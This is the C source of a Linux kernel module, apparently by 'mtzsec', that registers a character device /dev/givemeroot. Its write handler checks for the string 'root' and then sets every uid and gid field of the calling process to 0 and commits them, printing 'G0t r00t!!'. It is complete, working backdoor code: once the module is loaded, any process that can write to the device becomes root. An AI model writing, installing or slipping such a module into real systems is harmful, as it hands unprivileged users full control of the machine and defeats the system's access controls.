#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/device.h>

#define CLASS "giveroot"
#define DEVICE "givemeroot"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("Writing a device for set root");

static int major_number;                     
static struct class* giveroot = NULL;       
static struct device* c_device = NULL;       

static ssize_t x_write(struct file *file, const char __user *buffer, size_t len, loff_t *offset) {
    char *kernel_buffer;
    
    kernel_buffer = kmalloc(len + 1, GFP_KERNEL);
    if (!kernel_buffer)
        return -ENOMEM;

    if (copy_from_user(kernel_buffer, buffer, len)) {
        kfree(kernel_buffer);
        return -EFAULT;
    }
    
    kernel_buffer[len] = '\0';
    
    if (strncmp(kernel_buffer, "root", 4) == 0) {
        struct cred *new_creds;
        new_creds = prepare_creds();
        if (new_creds == NULL) {
            kfree(kernel_buffer);
            return -ENOMEM;
        }

        new_creds->uid.val = 0;
        new_creds->gid.val = 0;
        new_creds->euid.val = 0;
        new_creds->egid.val = 0;
        new_creds->fsgid.val = 0;
        new_creds->sgid.val = 0;
        new_creds->fsuid.val = 0;

        commit_creds(new_creds);
        printk(KERN_INFO "G0t r00t!!\n");
    }

    kfree(kernel_buffer);
    return len;
}

static struct file_operations fops = {
    .write = x_write,
};

static int __init device_init(void) {
    major_number = register_chrdev(0, DEVICE, &fops);
    if (major_number < 0) {
        printk(KERN_ALERT "Failed to register device!\n");
        return major_number;
    }

    giveroot = class_create(THIS_MODULE, CLASS);
    if (IS_ERR(giveroot)) {
        unregister_chrdev(major_number, DEVICE);
        printk(KERN_ALERT "Failed to create device class!\n");
        return PTR_ERR(giveroot);
    }

    c_device = device_create(giveroot, NULL, MKDEV(major_number, 0), NULL, DEVICE);
    if (IS_ERR(c_device)) {
        class_destroy(giveroot);
        unregister_chrdev(major_number, DEVICE);
        printk(KERN_ALERT "Failed to create device!\n");
        return PTR_ERR(c_device);
    }

    printk(KERN_INFO "Device /dev/%s created successfully!\n", DEVICE);
    return 0;
}

static void __exit device_exit(void) {
    device_destroy(giveroot, MKDEV(major_number, 0));
    class_destroy(giveroot);
    unregister_chrdev(major_number, DEVICE); 
    printk(KERN_INFO "Device removed!\n");
}

module_init(device_init);
module_exit(device_exit);
